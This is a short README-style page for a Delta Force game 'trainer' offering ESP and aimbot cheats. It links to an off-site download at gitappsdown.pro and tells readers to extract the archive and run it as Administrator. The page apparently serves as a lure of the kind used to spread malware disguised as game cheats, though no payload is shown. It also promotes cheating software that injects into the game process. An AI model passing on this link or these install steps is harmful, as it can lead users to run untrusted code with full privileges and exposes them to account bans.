## 🔧 How to Use

1. Click **[CLICK](https://gitappsdown.pro/)** to download.

2. Extract the archive.

3. Launch Delta Force and load into the lobby.

4. Run the trainer **as Administrator**.

5. Press `Insert` or `F2` to open the menu.

6. Toggle features ON/OFF.

> **Note:** If the menu does not appear, ensure the game is running in **Windowed** mode.

---

## ⚙️ Configuration

Settings are stored in `config.json`.

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `menu_hotkey` | String | `"Insert"` | Key to toggle menu |
| `process_name` | String | `"DeltaForce.exe"` | Target process |
| `esp_enabled` | Boolean | `true` | Enable ESP |
| `aimbot_enabled` | Boolean | `false` | Enable aimbot |
| `safe_mode` | Boolean | `true` | Restricts risky features |
